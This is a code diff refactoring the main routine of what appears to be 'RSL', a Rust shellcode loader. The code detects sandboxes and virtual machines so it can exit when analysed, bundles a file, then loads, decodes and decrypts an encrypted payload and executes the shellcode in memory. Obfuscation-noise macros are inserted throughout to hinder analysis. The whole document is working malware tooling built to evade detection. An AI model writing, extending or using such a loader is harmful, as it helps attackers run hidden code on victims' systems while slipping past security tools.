@@ -18,7 +18,7 @@ use exec::exec;
 use load::load;
 use rsl_macros::obfuscation_noise_macro;
 #[cfg(feature = "debug")]
-use utils::{print_error, print_message};
+use utils::{print_error, print_message, print_success};
 
 fn exit_program() -> ! {
     #[cfg(feature = "hw_syscall")]
@@ -39,66 +39,48 @@ fn start_program() {
     #[cfg(feature = "debug")]
     print_message("RSL started in debug mode.");
 }
-fn main() {
-    start_program();
-
+fn run() -> utils::RslResult<()> {
     #[cfg(feature = "sandbox")]
     if sandbox::guard_vm() {
-        #[cfg(feature = "debug")]
-        print_message("Sandbox/VM detected. Exiting...");
-        exit_program();
+        return Err(utils::RslError::SandboxDetected);
     } else {
         #[cfg(feature = "debug")]
-        print_message("Passed Sandbox/VM detection.");
+        print_success("Passed Sandbox/VM detection.");
     }
 
     #[cfg(feature = "with_bundling")]
-    if let Err(_e) = bundle::bundlefile() {
+    {
+        bundle::bundlefile()?;
         #[cfg(feature = "debug")]
-        print_error("Failed to bundle:", &_e);
-        exit_program();
-    } else {
-        #[cfg(feature = "debug")]
-        print_message("Bundling succeeded.");
+        print_success("Bundling succeeded.");
         obfuscation_noise_macro!();
     }
 
-    let encrypted_data = match load() {
-        Ok(data) => {
-            #[cfg(feature = "debug")]
-            print_message("Payload loaded successfully.");
-            obfuscation_noise_macro!();
-            data
-        }
-        Err(_e) => {
-            #[cfg(feature = "debug")]
-            print_error("Failed to load:", &_e);
-            exit_program();
-        }
-    };
+    let encrypted_data = load()?;
+    #[cfg(feature = "debug")]
+    print_success("Payload loaded successfully.");
+    obfuscation_noise_macro!();
 
     let decrypted_data = decode(&encrypted_data).unwrap();
 
-    unsafe {
-        let (shellcode_ptr, shellcode_len) = match decrypt(&decrypted_data) {
-            Ok(p) => {
-                #[cfg(feature = "debug")]
-                print_message("Payload decrypted successfully.");
-                obfuscation_noise_macro!();
-                p
-            }
-            Err(_e) => {
-                #[cfg(feature = "debug")]
-                print_error("Failed to decrypt:", &_e);
-                exit_program();
-            }
-        };
+    let (shellcode_ptr, shellcode_len) = unsafe { decrypt(&decrypted_data)? };
+    #[cfg(feature = "debug")]
+    print_success("Payload decrypted successfully.");
+    obfuscation_noise_macro!();
 
-        if let Err(_e) = exec(shellcode_ptr as usize, shellcode_len) {
-            #[cfg(feature = "debug")]
-            print_error("Failed to execute:", &_e);
-            exit_program();
-        }
+    unsafe {
+        exec(shellcode_ptr as usize, shellcode_len)?;
+    }
+    Ok(())
+}
+
+fn main() {
+    start_program();
+
+    if let Err(_e) = run() {
+        #[cfg(feature = "debug")]
+        print_error("Execution failed", &_e);
+        exit_program();
     }
 
     exit_program();
